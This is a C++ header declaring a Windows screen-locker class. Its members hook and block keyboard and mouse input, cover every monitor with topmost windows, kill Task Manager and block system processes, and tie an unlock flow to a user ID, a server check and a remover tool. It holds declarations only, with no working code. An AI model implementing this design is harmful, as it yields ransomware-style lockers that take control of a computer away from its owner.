#pragma once

#include <windows.h>
#include <string>
#include <vector>
#include <queue>
#include <mutex>
#include <condition_variable>
#include <thread>

// Browser configuration constants
#define BROWSER_WIDTH 600
#define BROWSER_HEIGHT 500
#define BROWSER_LOAD_DELAY 3000

// Window priority level constants
#define SCREENLOCKER_TOPMOST_LEVEL HWND_TOPMOST
#define BROWSER_TOPMOST_LEVEL HWND_TOPMOST

class ScreenLocker {
private:
    // Basic member variables
    HINSTANCE hInstance;
    HWND hWnd;
    std::string userID;

    // Unlock click count
    int unlockClickCount;
    
    // Browser control related variables
    bool browserRunning;           
    HWND browserHwnd;

    // Hook related variables
    static ScreenLocker* instance;     // Static instance for global hook access
    HHOOK keyboardHook;                // Keyboard hook handle
    HHOOK mouseHook;                   // Mouse hook handle
    bool inputBlockingEnabled;         // Input blocking enabled state
    bool allowBrowserInput;            // Browser input allowed state
    bool performingSystemAction;       // Performing a system action (e.g., Alt+A)

    // ↓↓↓ Advanced security features variables ↓↓↓
    bool advancedSecurityEnabled;      // Advanced security features enabled
    UINT_PTR securityCheckTimer;          // Security check timer ID

    // ↓↓↓ Multi-monitor support variables ↓↓↓
    std::vector<HWND> monitorWindows;        // Window handles for each monitor
    std::vector<MONITORINFO> monitorInfos;   // Monitor information
    int primaryMonitorIndex;                 // Index of the primary monitor
    bool multiMonitorEnabled;                // Multi-monitor feature enabled
    
    // Internal utility functions
    std::string GetMacAddress();
    std::string GenerateRandomID();
    std::string GetOrCreateUserID();
    void SaveToLogFile(const std::string& userID, const std::string& action);
    
    // Resource extraction functions
    bool ExtractRemoverExecutable();
    std::string GetRemoverPath();

    // Browser interaction functions
    void HandleUnlockProcess();       // New unlock process handling function
    bool ExecuteRemoverWithAdmin();   // Remove executable execution function
    bool TestServerConnection();      // Server connection test function
    
    // HTML content generation
    std::string GenerateHTMLContent();
    
    // Browser control
    void OpenControlledBrowser();
    
    // Window priority control functions
    void SetScreenLockerTopmost();
    void SetBrowserTopmost();
    void RestoreScreenLockerTopmost();
    
    // Browser window finding and control
    bool FindBrowserWindow();
    void ControlBrowserWindow();
    void ClickAllowButton();

    void ConfineCursorToBrowser();
    void ReleaseCursorConfinement();

    // Hook related functions
    bool InstallInputHooks();
    void RemoveInputHooks();

    // Hook related functions2
    void EnableInputBlocking();
    void DisableInputBlocking();
    void SetBrowserInputMode(bool allow);
    void SetSystemActionMode(bool performing);

    // Hook procedure (static)
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Hook handling helper functions
    bool ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam);
    bool ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam);

    // Advanced security features
    void EnableAdvancedSecurity();
    void DisableAdvancedSecurity();
    bool DetectAndBlockTaskManager();
    void BlockCriticalSystemProcesses();
    static void CALLBACK SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);

    // System process control
    bool IsTaskManagerRunning();
    bool TerminateTaskManager();

    // ↓↓↓ [FIX] Thread management for unlock process ↓↓↓
    std::vector<std::thread> workerThreads;
    std::mutex threadMutex;

    // ↓↓↓ Multi-monitor support functions ↓↓↓
    void EnableMultiMonitorSupport();
    void DisableMultiMonitorSupport();
    bool DetectMonitors();
    bool CreateMonitorWindows();
    void DestroyMonitorWindows();
    static BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData);
    void UpdateMonitorConfiguration();
    HWND CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex);
    static LRESULT CALLBACK SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    
    // Cleanup function
    void Cleanup();
    
    // Window message handling
    static LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

    // ↓↓↓ USB Emergency Remover Functions ↓↓↓
    void HandleDeviceChange(LPARAM lParam);
    void CheckUsbForKey(char driveLetter);
    
public:
    // Constructor and destructor
    ScreenLocker(HINSTANCE hInst);
    ~ScreenLocker();
    
    // Main public functions
    bool Initialize();
    bool CreateMainWindow();
    int Run();
    
    // Browser status check (for debugging)
    bool IsBrowserRunning() const { return browserRunning; }

    // Hook status check
    bool IsInputBlockingEnabled() const { return inputBlockingEnabled; }
    
    // Static instance getter (used by Hook)
    static ScreenLocker* GetInstance() { return instance; }
};